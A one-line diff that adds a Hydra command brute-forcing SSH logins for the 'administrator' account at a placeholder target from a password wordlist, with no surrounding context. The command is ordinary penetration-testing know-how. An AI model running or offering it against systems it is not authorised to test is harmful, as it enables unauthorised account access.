@@ -1,0 +1,1 @@
+hydra -l administrator -P passwords.txt ssh://TARGET_IP
